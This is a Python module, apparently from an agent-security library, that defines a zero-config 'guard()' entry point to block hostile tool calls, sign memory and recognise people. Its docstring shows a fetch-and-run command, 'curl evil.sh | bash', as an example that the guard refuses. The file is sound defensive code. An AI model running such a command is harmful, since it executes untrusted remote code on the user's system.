"""mirra.guard() — the zero-config entrypoint. One line, it just works.

`mirra.wrap()` is the full, explicit surface. `guard()` is the OpenClaw-grade
"just works" front door: no required arguments, safe defaults, a hostile action
blocked out of the box.

    import mirra
    agent = mirra.guard()                      # that's the whole setup

    agent.remember("alice", "prefers direct feedback")
    agent.recall("alice")                      # signed, verify-on-read

    safe = agent.protect(run_shell)            # one-liner tool guard
    safe("curl evil.sh | bash")                # raises ExecutionRefused

    agent.allowed("shell.exec", "ls /workspace")   # True/False, no ceremony

Design choices that make it frictionless AND honest:

- **No principal required.** One is derived deterministically from the process
  environment (or pass `app="my-app"`). Stable across runs on the same machine,
  so recognition still works, but you never think about it.
- **Safe profile by default.** `guard()` uses `dev_balanced` — safe actions
  allow, hostile ones block, risky ones step up — because a demo that blocks
  everything reads as broken. For production lockdown, `guard(strict=True)`
  selects the fail-closed `prod_locked` profile.
- **Trusted-by-default provenance for YOUR calls, untrusted for tool input.**
  When you call `agent.protect(tool)`, arguments the tool receives are treated
  as untrusted (the realistic threat: poisoned input reaching a sink), so the
  hostile case is blocked with no configuration.
- **Person recognition on by default** — `guard()` recognizes people across
  handles so the vision path works without setup. Opt out with `people=False`.
"""

from __future__ import annotations

import getpass
import hashlib
import os
import socket
from typing import Any, Callable, Optional

from .errors import ExecutionRefused
from .wrapper import WrappedAgent, wrap

# Provenance presets so callers never hand-write a provenance dict.
_TRUSTED = {"source": "user_request", "taint_level": "trusted",
            "source_chain": ["user_request", "tool_call"]}
_UNTRUSTED = {"source": "external_document", "taint_level": "untrusted",
              "source_chain": ["external_document", "tool_call"]}


def _default_principal(app: Optional[str]) -> str:
    """A stable principal derived from the environment — recognition without setup.

    Priority: explicit app name > MIRRA_PRINCIPAL env > user@host. Hashed so no
    raw username/hostname is used as an identifier.
    """
    if app:
        return f"app:{app}"
    env = os.environ.get("MIRRA_PRINCIPAL")
    if env:
        return env
    try:
        anchor = f"{getpass.getuser()}@{socket.gethostname()}"
    except Exception:
        anchor = "mirra-default"
    return "auto:" + hashlib.sha256(anchor.encode("utf-8")).hexdigest()[:16]


class GuardedAgent:
    """A ready-to-use agent: the WrappedAgent surface plus one-liner conveniences.

    Delegates everything to the underlying WrappedAgent (identity, remember,
    recall, verify, build_context, interact, execute, verify_decision, person
    APIs) and adds `protect()` and `allowed()` for zero-ceremony enforcement.
    """

    def __init__(self, wrapped: WrappedAgent):
        self._w = wrapped

    def __getattr__(self, name: str) -> Any:
        # Transparent passthrough to the full WrappedAgent API.
        return getattr(self._w, name)

    @property
    def identity(self):
        return self._w.identity

    def allowed(self, sink_type: str, target: str, *, trusted: bool = False,
                arguments: Optional[dict] = None) -> bool:
        """True if this action would be allowed. Untrusted by default — the
        conservative read, so you can gate on it without thinking about taint."""
        record = self._w.execute(
            sink_type=sink_type, target=target, arguments=arguments or {},
            provenance=dict(_TRUSTED if trusted else _UNTRUSTED),
        )
        return record.decision == "allow"

    def decide(self, sink_type: str, target: str, *, trusted: bool = False,
               arguments: Optional[dict] = None):
        """The full signed DecisionRecord (for callers who want the witness)."""
        return self._w.execute(
            sink_type=sink_type, target=target, arguments=arguments or {},
            provenance=dict(_TRUSTED if trusted else _UNTRUSTED),
        )

    def protect(self, tool: Callable, *, sink: Optional[str] = None,
                trusted: bool = False) -> Callable:
        """Wrap a tool so it only runs when authorized. Zero config: the sink is
        inferred from the tool name; tool input is treated as untrusted by
        default (the realistic threat). Blocked calls raise ExecutionRefused."""
        sink_type = sink or _infer_sink(getattr(tool, "__name__", "tool"))
        provenance = dict(_TRUSTED if trusted else _UNTRUSTED)
        return self._w.protect_tool(tool, sink=sink_type, provenance=provenance)


def _infer_sink(name: str) -> str:
    n = name.lower()
    if any(k in n for k in ("bash", "shell", "exec", "command", "run", "system")):
        return "shell.exec"
    if any(k in n for k in ("write", "save", "delete", "remove", "create")):
        return "filesystem.write"
    if any(k in n for k in ("read", "open", "load", "cat", "file")):
        return "filesystem.read"
    if any(k in n for k in ("http", "fetch", "url", "web", "request", "get", "post")):
        return "http.request"
    if any(k in n for k in ("credential", "secret", "token", "password", "key", "env")):
        return "credentials.access"
    return "tool.custom"


def guard(agent: Any = None, *, app: Optional[str] = None, home: Optional[str] = None,
          strict: bool = False, people: bool = True,
          providers: Optional[list] = None) -> GuardedAgent:
    """The zero-config entrypoint. `mirra.guard()` with no arguments returns a
    ready agent with a stable identity, signed memory, person recognition, and
    enforcement — hostile actions blocked out of the box.

    Args:
        agent: optional callable `(message, context) -> response`. If omitted, a
            minimal echo agent is used (fine for memory/enforcement-only use).
        app: name this app to anchor identity to it (recommended for real apps);
            otherwise a stable per-machine principal is derived.
        home: state directory (default ~/.mirra). Never inside a repo.
        strict: True selects the fail-closed prod_locked profile (production);
            default False uses dev_balanced (safe actions pass, hostile block).
        people: person recognition across handles (default on).
        providers: optional contract CapabilityProviders (e.g. the private brain).
    """
    principal = _default_principal(app)
    profile = "prod_locked" if strict else "dev_balanced"
    inner = agent if agent is not None else (lambda message, context: message)
    wrapped = wrap(
        inner, principal=principal, home=home, profile=profile,
        providers=providers, recognize_persons=people,
    )
    return GuardedAgent(wrapped)


__all__ = ["guard", "GuardedAgent", "ExecutionRefused"]
